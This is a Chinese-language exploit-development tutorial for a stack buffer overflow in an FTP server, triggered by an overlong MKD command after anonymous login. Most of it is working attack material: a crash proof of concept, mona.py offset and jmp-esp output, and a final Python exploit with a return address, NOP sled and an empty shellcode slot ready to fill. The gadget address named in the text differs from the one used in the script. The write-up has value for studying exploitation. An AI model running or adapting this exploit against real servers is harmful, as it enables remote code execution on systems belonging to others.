### 漏洞重现

首先我们创建一个针对FTP Server的漏洞的利用框架，后面我们将在此基础上开发我们的漏洞利用程序，我们使用FTP server默认配置已经存在的账户名”anonymous”:

### 分析环境

软件| 版本
 :-: | -:
 系统| Windows XP
调试器 | Immunity Debugger
反编译 | IDA

首先我们将服务器开启， 然后发送数据，我们看到程序发生了错误。

POC
```
#!/usr/bin/python
import socket
import sys
evil = "A"*1000
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.44.166',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
```
然后可以到系统奔溃如下
![程序奔溃](/images\/20180804182242.jpg)
#### 漏洞分析
我们使用OD调试器附加程序，然后再一次发送运行POC，发送数据。程序中断到调试器，如下图，我们看到EIP = 0x41414141
并且EBP和ESP都被覆盖，所以这是典型的栈溢出漏洞。
在对recv下断点之后，我们发现先接收到了user和pass参数，然后接收到我们的畸形数据。在跟踪过程，发现程序在一处复制数据中，未对数据长度进行限制，进而造成栈溢出漏洞。
![程序奔溃](/images\/20180804195658.png)
![漏洞溢出点](/images\20180805102428.png)
#### Exploit编写


首先我们使用 mona.py的pattern_create和pattern_offset工具来帮助我们发现究竟有多大的空间，我们以什么特定的内存地址为目标。我们用以下的字符串替换POC中的"A"*1000，在此启动server,用调试器附加。
```
<pattern_create 1000>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4
```

```
!mona findmsp

0BADF00D   [+] Command used:
0BADF00D   !mona findmsp
0BADF00D   [+] Looking for cyclic pattern in memory
0BADF00D       Cyclic pattern (normal) found at 0x00c4fb29 (length 255 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x009216a9 (length 255 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x009217c4 (length 255 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x69413269 (offset 247)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (entire stack) - looking for cyclic pattern
0BADF00D       Walking stack from 0x00c4f000 to 0x00c4fffc (0x00000ffc bytes)
0BADF00D       0x00c4fb2c : Contains normal cyclic pattern at ESP-0x100 (-256) : offset 3, length 252 (-> 0x00c4fc27 : ESP-0x4)
0BADF00D   [+] Examining stack (entire stack) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x00c4f000 to 0x00c4fffc (0x00000ffc bytes)
0BADF00D       0x00c4f7d4 : Pointer into normal cyclic pattern at ESP-0x458 (-1112) : 0x00c4fc10 : offset 231, length 24
0BADF00D       0x00c4f7e8 : Pointer into normal cyclic pattern at ESP-0x444 (-1092) : 0x00c4fc24 : offset 251, length 4
0BADF00D       0x00c4f97c : Pointer into normal cyclic pattern at ESP-0x2b0 (-688) : 0x00c4fba8 : offset 127, length 128
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:05.875000

```
我们可以知道EIP在247个字节之后被覆盖，同样ESP指向的缓冲区包含了我们可控的数据。知道这些数据后，我们可以重新布置脚本如下，

Evil = 247*"A" + "B"*4+ 749*"C"

现在我们可以用一个指针替换BBBB，将程序重定向到ESP(CCCC数据)所指的地方，唯一需要注意的是这个指针不能包含坏字符，可以使用“mona”
```
!mona jmp -r ESP



 Message=  0x7c86467b : jmp esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\kernel32.dll)

```
我们使用列表中的第一个，我们将POC布置成如下

我们用payload插入现在CCCC…地方, 如果插入的payload长度不固定, 我们希望缓冲区长度动态修改以便我们不需要重新计算长度. 还应该插入一些NOP’s(空操作= \x90) 填充在payload前面. 你可以下面看到结果. 插入到shellcode变量的任何shellcode都能被执行
```

#!/usr/bin/python
import socket
import sys
shellcode = (
)
#------------------------------------------------------------
# Badchars: \x00\x0A\x0D
# 0x77c35459 : push esp #  ret  | msvcrt.dll
#------------------------------------------------------------
buffer = "\x90"*20 + shellcode
evil = "A"*247 + "\x59\x54\xC3\x77" + buffer + "C"*(749-len(buffer))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.111.128',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close

```
